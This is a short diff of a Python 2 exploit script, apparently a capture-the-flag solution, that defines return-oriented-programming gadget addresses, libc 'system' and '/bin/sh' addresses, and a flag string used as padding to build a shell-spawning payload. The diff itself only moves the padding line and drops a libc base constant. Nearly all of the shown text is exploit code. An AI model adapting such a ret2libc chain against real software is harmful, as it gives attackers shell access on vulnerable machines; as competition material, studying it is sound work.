@@ -57,14 +57,12 @@ rip+0x40    pop3ret_addr
 #!/usr/bin/env python2
 from struct import pack
 
-pad = "hctf{LJ_y6cdc_qweert!}"
-
-libcbase = 0x00007FFFF75D3000
-
 pop3    = 0x00007ffff75f35ad
 poprdi  = 0x00007ffff75f59f2
 system  = 0x00007FFFF7618310
 binsh   = 0x00007FFFF774CFE7 
+
+pad = "hctf{LJ_y6cdc_qweert!}"
 
 shellcode = ""
 shellcode += pad 
